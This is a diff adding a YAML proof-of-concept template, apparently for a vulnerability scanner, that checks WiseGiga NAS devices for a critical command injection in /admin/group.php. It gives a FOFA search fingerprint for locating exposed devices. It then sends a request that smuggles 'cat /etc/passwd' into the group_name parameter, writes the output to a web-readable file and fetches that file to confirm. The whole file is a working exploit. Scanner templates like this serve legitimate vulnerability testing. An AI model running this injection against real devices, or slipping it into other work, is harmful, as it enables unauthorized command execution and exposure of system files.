@@ -1,0 +1,26 @@
+id: poc-yaml-wisegiga-nas-group-php-command-injection
+info:
+  name: WiseGiga NAS group.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: WISEGIGA NAS
+  fofa: app="WISEGIGA-NAS"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /admin/group.php?memberid=root&cmd=add&group_name=d;cat+/etc/passwd>{{.t1}}.txt
+  expression: status_code == 200
+- method: GET
+  path: /admin/{{.t1}}.txt
+  expression: 'status_code == 200
+
+    && contains(body,"/bin")
+
+    && contains(body,"root:")
+
+    && !contains(body,"<")
+
+    '
+transport: http
